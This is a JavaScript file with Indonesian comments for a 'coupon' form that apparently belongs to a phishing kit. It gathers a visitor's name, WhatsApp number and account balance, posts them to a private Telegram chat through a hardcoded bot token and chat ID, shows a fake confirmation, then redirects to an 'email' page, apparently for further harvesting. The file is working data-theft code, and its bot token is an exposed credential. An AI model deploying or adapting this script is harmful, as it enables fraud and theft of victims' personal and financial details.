// script.js - Handle form submit, kirim ke Telegram, dan redirect
$(document).ready(function() {
    $('#formData').on('submit', function(e) {
        e.preventDefault(); // Cegah submit default ke action form

        // Ambil data dari form
        var nama = $('#namalengkap').val().trim();
        var nowa = $('#nowa').val().trim();
        var saldo = $('#dengan-rupiah').val().trim();
        var kupon = $('#kupon').val();

        // Validasi sederhana
        if (nama === '' || nowa === '' || saldo === '' || kupon === '') {
            alert('Harap isi semua field yang diperlukan.');
            return false;
        }

        // Format saldo jika ada fungsi rupiah (dari rupiah.js)
        if (typeof formatRupiah === 'function') {
            saldo = formatRupiah(saldo);
        }

        // Simpan data ke localStorage
        var dataKupon = {
            nama: nama,
            nowa: nowa,
            saldo: saldo,
            kupon: kupon,
            timestamp: new Date().toISOString()
        };
        localStorage.setItem('kuponData', JSON.stringify(dataKupon));

        // Kirim data ke Telegram via Bot API
        var botToken = '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk';  // Ganti dengan token bot Anda
        var chatId = '5529657606';       // Ganti dengan chat ID Anda
        var message = `🎉 Kupon Baru Dicetak!\n\n` +
                      `Nama: ${nama}\n` +
                      `No. WhatsApp: ${nowa}\n` +
                      `Saldo Akhir: ${saldo}\n` +
                      `Kupon: ${kupon}\n` +
                      `Waktu: ${dataKupon.timestamp}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Response Telegram:', data);  // Debug: Lihat di console
            if (data.ok) {
                alert('Kupon berhasil dicetak dan dikirim ke Telegram!');
                // Redirect otomatis ke halaman kedua setelah sukses
                window.location.href = 'email.html';  // Ganti dengan URL halaman kedua Anda
            } else {
                console.error('Error Telegram:', data);
                alert('Gagal mengirim ke Telegram: ' + data.description);
                // Opsional: Tetap redirect jika mau, uncomment baris di bawah
                // window.location.href = 'email.html';
            }
        })
        .catch(error => {
            console.error('Fetch error:', error);
            alert('Error jaringan. Coba lagi.');
            // Opsional: Tetap redirect jika mau, uncomment baris di bawah
            // window.location.href = 'email.html';
        });

        // Simulasi cetak kupon (tampilkan di halaman sebelum redirect)
        var kuponHTML = `
            <div style="text-align: center; margin-top: 20px; padding: 20px; border: 1px solid #ccc; background: #f9f9f9;">
                <h3>Kupon Anda Telah Dicetak!</h3>
                <p><strong>Nama:</strong> ${nama}</p>
                <p><strong>No. WhatsApp:</strong> ${nowa}</p>
                <p><strong>Saldo Akhir:</strong> ${saldo}</p>
                <p><strong>Kupon:</strong> ${kupon}</p>
                <p>Mengalihkan ke halaman berikutnya...</p>
            </div>
        `;
        $('.coverform').after(kuponHTML);

        // Reset form
        $('#formData')[0].reset();

        console.log('Data Kupon:', dataKupon);
    });

    // Error handling global
    window.onerror = function(msg, url, line) {
        console.error('Error JS: ' + msg + ' at ' + url + ':' + line);
    };
});
